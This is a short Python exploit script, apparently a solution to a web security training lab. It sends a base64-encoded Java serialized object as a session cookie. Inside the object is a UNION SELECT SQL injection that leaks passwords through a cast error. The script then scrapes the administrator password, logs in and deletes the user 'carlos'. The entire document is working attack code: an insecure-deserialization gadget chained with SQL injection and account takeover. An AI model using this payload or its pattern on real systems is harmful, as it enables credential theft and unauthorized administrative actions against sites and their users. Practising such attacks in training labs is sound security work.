from urllib.parse import quote
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/admin/delete?username=carlos'
my_acc = burp_url + '/my-account'

Final_SQL_ser_payload = "rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsTlVMTCwgTlVMTCwgTlVMTCwgQ0FTVChwYXNzd29yZCBhcyBudW1lcmljKSwgTlVMTCwgTlVMTCwgTlVMTCBGUk9NIHVzZXJzIC0t"


session = requests.Session()
burp_cookies = {"session": quote(Final_SQL_ser_payload)}
response = requests.get(my_acc, cookies=burp_cookies)
pass_match = re.search(r'([0-9a-zA-Z]{20})', response.text)
password = pass_match.group(1)

burp_data = {"username": "administrator", "password": password}
session.post(login_url, data=burp_data)
session.get(delete_url)
